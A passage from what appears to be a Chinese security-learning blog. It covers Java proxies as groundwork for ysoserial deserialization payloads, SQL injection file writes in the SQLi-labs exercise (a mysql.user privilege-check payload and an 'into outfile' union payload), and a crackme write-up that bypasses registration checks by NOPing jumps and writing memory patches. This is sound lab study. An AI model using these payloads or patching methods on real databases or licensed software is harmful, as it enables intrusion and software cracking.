<h2 id="Master-node-unavailable-after-shutting-down-a-worker-node"><a href="#Master-node-unavailable-after-shutting-down-a-worker-node" class="headerlink" title="Master node unavailable after shutting down a worker node"></a>Master node unavailable after shutting down a worker node</h2><p>I encountered this problem when I used only two nodes for the Kubernetes cluster, which is only one master node(with worker installed) and one worker node</p>
<p><strong>Solution</strong></p>
<ul>
<li>Having one more worker node. When a worker node is unavailable, after 5 minutes, a new pod will be created on another available working node automatically.</li>
</ul>
]]></content>
      <tags>
        <tag>Rancher</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之静态代理与动态代理(5)</title>
    <url>/2021/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看了很多前辈的文章，都提到了Java的一大核心机制: 动态代理机制(<strong>Dynamic Proxy</strong>), 这一知识点我断断续续看了有好几天，不复杂但有点绕，所以一直没有写出这篇博文，好在查询了众多资料，现在有了一些自己的理解。</p>
<p>这一章将探究<strong>JAVA静态和动态代理机制</strong> - 有助于我们理解YSoSerial的playload实现机制。</p>
<span id="more"></span>

<h1 id="Java代理机制"><a href="#Java代理机制" class="headerlink" title="Java代理机制"></a>Java代理机制</h1><h2 id="什么是代理机制"><a href="#什么是代理机制" class="headerlink" title="什么是代理机制"></a>什么是代理机制</h2><p>Proxy Design实际上是一种软件设计模式，</p>
<blockquote>
<p>A proxy receives client requests, does some work (access control, caching, etc.) and then passes the request to a service object.</p>
</blockquote>
<p>因为安全问题，client不允许直接access服务端上的某个服务，需要一个Proxy class先处理client的请求，通过Proxy class来访问这个服务，再返回给Client。</p>
<p>而Proxy Class就是代理， 委托Proxy Class帮他和客户建立连接的服务就是Delegate Class - 委托类（被代理）。</p>
<p>通常Proxy和Delegate委托类有<strong>相同的方法</strong>，且Proxy<strong>拥有委托类的reference</strong>，可以调用其方法。在调用其方法的时候，Proxy可以在其基础上添加或者修改功能，这样就不需要修改到委托类，修改代理类本身就可以了。</p>
<p>一个形象的例子：A是房东，他需要出租自己的房子，他会委托代理B（中介）把房子挂在网上，当客户C需要租房时，C会直接和代理B进行交流而不是直接和房东A交流。</p>
<p>所以我们可以得出使用代理模式的好处：</p>
<ul>
<li>Proxies 让我们可以在不改变委托类的情况下，自定义修改委托类方法代码执行前和执行后的behaviour</li>
<li>Proxy pattern是安全的。一个远程的代理可以提供一个proxy stub给客户端， 然后在Server端call the implementation（此处是不是很像我们在<a href="https://leihehehe.github.io/2021/07/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B-2/">Java反序列化漏洞之JAVA RMI原理、流程(2)</a>中所提到的<strong>JAVA RMI</strong>呢？）</li>
</ul>
<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>静态代理就是手动编写代理类。</p>
<p><strong>委托类和代理类要实现相同的接口</strong></p>
<p><img src="https://pic2.zhimg.com/v2-001c5db900d8785d47c1a5a0c6f32762_r.jpg?source=1940ef5c" alt="preview"></p>
<p>来看看<strong>静态代理</strong>是如何实现的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TestDelegate</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestImp</span> <span class="keyword">implements</span> <span class="title class_">TestDelegate</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代理类handle一个委托类的object：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProxy</span> <span class="keyword">implements</span> <span class="title class_">TestDelegate</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">TestDelegate</span> <span class="variable">testDelegate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestImp</span>();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is a hello world message&quot;</span>);<span class="comment">//自定义在前面输出信息</span></span><br><span class="line">        testDelegate.sayHello();<span class="comment">//call委托类的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Client尝试访问sayHello():</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">TestProxy</span> <span class="variable">testProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestProxy</span>();</span><br><span class="line">        testProxy.sayHello();<span class="comment">//client没有直接访问TestImp的权限，只能通过TestProxy访问</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-5/image-20210809150635426.png" alt="image-20210809150635426"></p>
<p><strong>静态代理的缺陷：</strong></p>
<p>程序员要手动为每一个委托类编写一个对应的代理类，如果当前系统有上百千个类，工作量就太大了。而动态代理可以帮助我们解决这个问题。</p>
<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>动态代理，简单的说就是用一个代理类帮我们动态生成了不同类的代理，我们不需要手动针对每个委托类编写一个队形的代理类。</p>
<blockquote>
<p>InvocationHandler接口：负责提供调用代理操作。</p>
<p>是由代理对象调用处理器实现的接口，定义了一个invoke()方法，每个代理对象都有一个关联的接口。当代理对象上调用方法时，该方法会被自动转发到InvocationHandler.invoke()方法来进行调用。</p>
</blockquote>
<p>看代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TestDelegate</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestImp</span> <span class="keyword">implements</span>  <span class="title class_">TestDelegate</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dynamic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="comment">//中间类必须要实现InvocationHandler</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agency</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">bind</span><span class="params">(Object target)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.target=target;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过传入进来的target（委托）类，通过直接得到他的类加载器，实现的接口和当前的invoationHandler来返回一个新的代理，相比于静态代理我们需要手动写一个代理类，动态代理根据传入的参数自动生成一个代理类</span></span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(),<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">//代理被执行代码的时候 invoke()会被call</span></span><br><span class="line">        <span class="comment">//这里你可以通过判断方法名等等，做出不同的修改</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Delegate Start&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">res</span> <span class="operator">=</span> method.invoke(target,args);<span class="comment">//此处使用了反射,使用target里面的method</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Delegate End...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dynamic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Agency</span> <span class="variable">agency</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Agency</span>();</span><br><span class="line">        <span class="type">TestDelegate</span> <span class="variable">test</span> <span class="operator">=</span> (TestDelegate) agency.bind(<span class="keyword">new</span> <span class="title class_">TestImp</span>());<span class="comment">//此处我们得到了一个代理类（动态生成的）</span></span><br><span class="line">        System.getProperties().put(<span class="string">&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;</span>,<span class="string">&quot;true&quot;</span>);<span class="comment">//这里会有生成的动态代理类的字节码文件</span></span><br><span class="line">        test.sayHello();<span class="comment">//执行该代理类的方法时，代理类中的invoke()会被call</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-5/image-20210811223911668.png" alt="image-20210811223911668"></p>
<p>由此可见，动态代理的作用：</p>
<ul>
<li><p>动态代理只需要实现一个代理类，而静态代理需要实现多个代理类</p>
</li>
<li><p>解耦，通过参数就可以判断真实类，不需要实现实例化，更加灵活多变</p>
</li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.zhihu.com/question/20794107/answer/658139129">Java 动态代理作用是什么？ - bravo1988的回答 - 知乎 </a></p>
<p><a href="https://www.zhihu.com/question/20794107/answer/23330381">Java 动态代理作用是什么？ - ZeaTalk的回答 - 知乎</a></p>
<p><a href="https://b1ngz.github.io/java-dynamic-proxy/">Java Dynamic Proxy</a></p>
<p><a href="https://medium.com/@shohraafaque/proxies-in-java-static-dynamic-8ccc51d16346">Proxies in Java — Static &amp; Dynamic</a></p>
<p><a href="https://xz.aliyun.com/t/9197">JAVA安全基础（三）– java动态代理机制</a></p>
<p><a href="http://wjlshare.com/archives/1430">Java 静态代理&amp;动态代理学习</a></p>
<p><a href="https://www.guildhab.top/2020/07/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E5-%E8%A7%A3%E5%AF%86-ysoserial-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/">Java 反序列化漏洞(5) – 解密 YSoSerial : Java动态代理机制</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入文件读写问题</title>
    <url>/2021/07/04/SQL%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="SQL注入中的文件读写问题"><a href="#SQL注入中的文件读写问题" class="headerlink" title="SQL注入中的文件读写问题"></a>SQL注入中的文件读写问题</h1><p>在SQLilab第七关中遇到了文件写不出来的问题，经过查询资料，最后终于解决问题，总结如下</p>
<span id="more"></span>

<h2 id="读写权限"><a href="#读写权限" class="headerlink" title="读写权限"></a>读写权限</h2><ul>
<li><p><strong>数据库用户读取权限</strong></p>
<blockquote>
<p>and (select count(<em>) from mysql.user)&gt;0/</em> 如果结果返回正常,说明具有读写权限。<br>and (select count(<em>) from mysql.user)&gt;0/</em> 返回错误，应该是管理员给数据库帐户降权</p>
</blockquote>
</li>
<li><p><strong>数据库读写权限：</strong></p>
<p>新版的MYSQL会有权限限制：</p>
<p>查看权限：<code>show global variables like &#39;%secure%&#39;</code> </p>
<p>得到下图：<img src="/image/SQL%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E9%97%AE%E9%A2%98/image-20210704223102960.png" alt="image-20210704223102960"></p>
</li>
</ul>
<blockquote>
<p>secure_file_priv = 空的时候 ，任意读写</p>
<p>secure_file_priv = 某个路径的时候，只能在规定的那个路径下读写</p>
<p>secure_file_priv = NULL 不能读写</p>
</blockquote>
<h2 id="修改数据库读写权限"><a href="#修改数据库读写权限" class="headerlink" title="修改数据库读写权限"></a>修改数据库读写权限</h2><p>以<strong>phpstudy_pro</strong>为例</p>
<ul>
<li><img src="/image/SQL%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E9%97%AE%E9%A2%98/image-20210704223705953.png" alt="image-20210704223705953"></li>
<li>在mysqld处添加<img src="/image/SQL%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E9%97%AE%E9%A2%98/image-20210704223736958.png" alt="image-20210704223736958"></li>
</ul>
<h2 id="写出文件"><a href="#写出文件" class="headerlink" title="写出文件"></a>写出文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3 into outfile &#x27;D:\\222.txt&#x27;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web Security</category>
        <category>SQL Injection</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>SQL Injection</tag>
        <tag>SQLilab</tag>
      </tags>
  </entry>
  <entry>
    <title>NCK逆向课后作业writeup</title>
    <url>/2021/12/02/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>个人的一些逆向小练习和解题思路</p>
<p>每天一道</p>
<span id="more"></span>

<h1 id="课后小程序下载地址"><a href="#课后小程序下载地址" class="headerlink" title="课后小程序下载地址"></a>课后小程序下载地址</h1><p>链接：<a href="https://pan.baidu.com/s/1U-LK9lZf4CjVjUCuSSFIlQ">https://pan.baidu.com/s/1U-LK9lZf4CjVjUCuSSFIlQ</a><br>提取码：k5pf </p>
<h1 id="第一课课后作业"><a href="#第一课课后作业" class="headerlink" title="第一课课后作业"></a>第一课课后作业</h1><h2 id="软件使用"><a href="#软件使用" class="headerlink" title="软件使用"></a>软件使用</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203152510850.png" alt="image-20211203152510850"></p>
<h2 id="MessageBoxA-API断点"><a href="#MessageBoxA-API断点" class="headerlink" title="MessageBoxA API断点"></a>MessageBoxA API断点</h2><p>通过信息框，猜测有<code>MessageBox</code> API被调用，<code>ctrl+g</code>找到调用处，直接下断点</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203152727330.png" alt="image-20211203152727330"></p>
<p>点击按钮后让他在此处断下。</p>
<p>看见右下方堆栈顶端显示了CALL的返回地址，右键跟随反汇编窗口。</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203152857114.png" alt="image-20211203152857114"></p>
<p>这里跟随到的是返回地址，这样我们就可以找到这个<code>MessageBoxA</code>的返回地址了。</p>
<p>在此处下断点，继续运行，让他断到这里来。往上看了下，好像并没有看见什么明显的判断条件，继续F8。<img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203153141019.png" alt="image-20211203153141019"></p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203153406827.png" alt="image-20211203153406827"></p>
<p>往上面找，但发现这个我们猜测的成功的call并没有命令跳过它。继续往上看，发现又有2个这样的call，同时有个je跳过了这2个call</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203153609778.png" alt="image-20211203153609778"></p>
<p>基本可以确定是这个跳转的问题了。</p>
<p>直接nop掉。</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203153658090.png" alt="image-20211203153658090"></p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203153721601.png" alt="image-20211203153721601"></p>
<h2 id="交叉引用查找法"><a href="#交叉引用查找法" class="headerlink" title="交叉引用查找法"></a>交叉引用查找法</h2><p>先是在OD里字符串搜索，发现找不到字符串“注册失败” - OD里的各种插件可能会导致这个问题。于是转用IDA。</p>
<p>视图-》子视图-》字符串， 搜索<code>注册失败</code></p>
<blockquote>
<p>搜索字符串还是搜索不到?</p>
<p>在快捷方式处添加<code>-dCULTURE=all</code></p>
</blockquote>
<p>找到后双击跟过去<img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203154530079.png" alt="image-20211203154530079"></p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203154638521.png" alt="image-20211203154638521"></p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203154720897.png" alt="image-20211203154720897"></p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203154812809.png" alt="image-20211203154812809"></p>
<p>上面的JE就是关键跳了。NOP掉即可</p>
<h2 id="内存查找法"><a href="#内存查找法" class="headerlink" title="内存查找法"></a>内存查找法</h2><p>我们知道软件在运行的时候，函数的数据是会保存在内存里的</p>
<p>如果我们运行软件后将他暂停，再看内存窗口的话，可以查找到字符串</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203155354377.png" alt="image-20211203155354377"></p>
<p>内存断点或硬件断点即可。</p>
<p>注意，如果硬件断点不起作用，可能是OD的问题，它各种反调试插件、汉化等等都可能导致这个问题，我们可以使用<strong>x64dbg.</strong></p>
<h2 id="栈回溯-ALT-K暂停法"><a href="#栈回溯-ALT-K暂停法" class="headerlink" title="栈回溯 ALT+K暂停法"></a>栈回溯 ALT+K暂停法</h2><p>软件再执行call的时候，会把一些参数都压入堆栈，最后执行完后再pop出来，我们可以在弹出信息框的时候给他暂停，这样参数都会保留在stack中，这时我们再去OD的K窗口（栈回溯窗口），就能看到function的信息了。</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203155835217.png" alt="image-20211203155835217"></p>
<h2 id="GetWindowTextA-API断点"><a href="#GetWindowTextA-API断点" class="headerlink" title="GetWindowTextA API断点"></a>GetWindowTextA API断点</h2><p>对<code>GetWindowTextA</code> API进行断点，执行程序后被断下，一直F8。</p>
<p>发现在做比较，正确的字符串已经获取到了。</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203160619957.png" alt="image-20211203160619957"></p>
<p>后续就不分析了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>之前一直以为从断下的地方跳一层就会回到主函数下面，导致这么简单都没搞出来，事实上跳N层都是有可能的。</p>
<h1 id="第二课课后作业"><a href="#第二课课后作业" class="headerlink" title="第二课课后作业"></a>第二课课后作业</h1><h2 id="软件使用-1"><a href="#软件使用-1" class="headerlink" title="软件使用"></a>软件使用</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204090025209.png" alt="image-20211204090025209"></p>
<h2 id="栈溯源法-ALT-K暂停法"><a href="#栈溯源法-ALT-K暂停法" class="headerlink" title="栈溯源法 ALT+K暂停法"></a>栈溯源法 ALT+K暂停法</h2><p>加载程序后运行，点击按钮让他弹出信息框，然后暂停。</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204090912027.png" alt="image-20211204090912027"></p>
<p>在窗口K中找到堆栈信息，双击</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204090935331.png" alt="image-20211204090935331"></p>
<p>发现有跳转，直接enter进入</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204090953203.png" alt="image-20211204090953203"></p>
<p>在此处断点</p>
<p>再让程序跑一次，找到最终返回的地方。</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204091114188.png" alt="image-20211204091114188"></p>
<p>此处跳过了成功消息，将JNZ改为NOP</p>
<h2 id="交叉引用断点"><a href="#交叉引用断点" class="headerlink" title="交叉引用断点"></a>交叉引用断点</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204093044610.png" alt="image-20211204093044610"></p>
<p>在OD处修改即可。</p>
<p><strong>如何在IDA修改？</strong></p>
<p>选项-》常规-》操作数字节-》16</p>
<p>编辑-》修补程序-》汇编</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204093940723.png" alt="image-20211204093940723"></p>
<p>nop两次把这两个都填充</p>
<p>编辑-》修补程序-》修补程序到输入文件</p>
<p>EA起始为你的基址</p>
<p>生成即可</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204094300480.png" alt="image-20211204094300480"></p>
<h2 id="补丁使用"><a href="#补丁使用" class="headerlink" title="补丁使用"></a>补丁使用</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204094354057.png" alt="image-20211204094354057"></p>
<h1 id="第三课课后作业"><a href="#第三课课后作业" class="headerlink" title="第三课课后作业"></a>第三课课后作业</h1><h2 id="软件使用-2"><a href="#软件使用-2" class="headerlink" title="软件使用"></a>软件使用</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205103356194.png" alt="image-20211205103356194"></p>
<h2 id="MessageBoxA-API断点-1"><a href="#MessageBoxA-API断点-1" class="headerlink" title="MessageBoxA API断点"></a>MessageBoxA API断点</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205103426796.png" alt="image-20211205103426796"></p>
<p>发现带壳，之后得用补丁。</p>
<p>先让程序运行起来，下断点MessageBoxA</p>
<p>找到关键跳，需要修改JE为nop</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205103920873.png" alt="image-20211205103920873"></p>
<h2 id="补丁使用-1"><a href="#补丁使用-1" class="headerlink" title="补丁使用"></a>补丁使用</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205104024600.png" alt="image-20211205104024600"></p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205104112887.png" alt="image-20211205104112887"></p>
<h1 id="第四课课后作业"><a href="#第四课课后作业" class="headerlink" title="第四课课后作业"></a>第四课课后作业</h1><h2 id="E语言写内存补丁"><a href="#E语言写内存补丁" class="headerlink" title="E语言写内存补丁"></a>E语言写内存补丁</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205104706503.png" alt="image-20211205104706503"></p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205104725383.png" alt="image-20211205104725383"></p>
<h2 id="E语言写劫持补丁"><a href="#E语言写劫持补丁" class="headerlink" title="E语言写劫持补丁"></a>E语言写劫持补丁</h2><p>检测数据是否被壳还原 -》 检测004010A9地址的数据是否为0x55(85)</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205124112526.png" alt="image-20211205124112526"></p>
<h2 id="C语言写内存补丁"><a href="#C语言写内存补丁" class="headerlink" title="C语言写内存补丁"></a>C语言写内存补丁</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205124716992.png" alt="image-20211205124716992"></p>
<p>这里主要是用<code>OpenProcess()</code>和<code>WriteProcessMemory()</code>来完成内存写入操作的。</p>
<h1 id="第五课课后作业"><a href="#第五课课后作业" class="headerlink" title="第五课课后作业"></a>第五课课后作业</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>这一课涉及到了很多知识点，我花了两三天的事件才慢慢把各个知识点理清楚。 主要涉及到了硬件断点、硬件HOOK和线程方面的知识，虽然老师只讲了一节课，但是自己真正弄清楚并实践还是得费不少时间。另外我使用的VS2022版本给我带来了不少麻烦，各种不兼容，还好最后解决了，之后可能会出一些解决VS问题的合集。</p>
<p>该课后作业的要求是<strong>不修改代码从而实现破解。</strong></p>
<h2 id="软件使用-3"><a href="#软件使用-3" class="headerlink" title="软件使用"></a>软件使用</h2><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208125058597.png" alt="image-20211208125058597"></p>
<h2 id="SetWindowTextA-寻找关键跳"><a href="#SetWindowTextA-寻找关键跳" class="headerlink" title="SetWindowTextA 寻找关键跳"></a>SetWindowTextA 寻找关键跳</h2><p>OD载入发现有壳</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208125215342.png" alt="image-20211208125215342"></p>
<p>我们将它运行起来 - 加壳的程序必须运行起来，才会被恢复源码。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208125611118.png" alt="image-20211208125611118"></p>
<p><strong>注册失败</strong>的信息显示在了标题上，那么可以猜测它使用了SetWindowTextA函数，下一个断点。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208125735454.png" alt="image-20211208125735454"></p>
<p>断下来了，开始F8。现在走到了一个可疑的地方，附近有大跳，我们用Immlabel插件标记一下，发现上面也有一处一样的call，那么猜测可能是成功的call。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208125913192.png" alt="image-20211208125913192"></p>
